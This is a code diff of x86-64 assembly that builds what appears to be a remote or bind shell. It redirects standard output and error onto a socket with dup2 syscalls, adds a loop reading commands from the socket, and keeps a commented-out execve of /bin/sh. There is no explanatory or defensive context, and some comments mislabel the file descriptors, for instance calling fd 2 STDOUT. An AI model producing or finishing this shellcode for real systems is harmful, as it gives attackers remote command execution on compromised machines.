@@ -42,10 +42,20 @@ syscall
 
 mov r9, rdi                ; save fd of socket
 
+; STDOUT
+mov rax, 33
+mov rdi, r9                ; newfd = socket fd
+mov rsi, 1                  ; oldfd = 1 (STDOUT)
+syscall
 
+mov rax, 33
+mov rsi, 2                  ; oldfd = 2 (STDOUT)
+syscall
+
+.loop:
 call _read
-
-call _echo
+jmp .loop
+;call _echo
 
 
 ;               SYS_DUP2
@@ -99,12 +109,9 @@ _read:
         xor rdx, rdx  
         xor r14, r14
         mov r14, rsp
+        mov r12, r14
         push qword rdx
 
-        cmp rbx, 0
-        jne .donotsavestartcommand
-            mov r12, r14 ; save start of command string
-        .donotsavestartcommand:
         ; add to total read bytes
         add rbx, rax
 
@@ -136,6 +143,7 @@ _read:
 
         .endofcommand:
     
+    xor rax, rax
     
     ; EXECVE /BIN/SH
     ;mov rdx, rsp
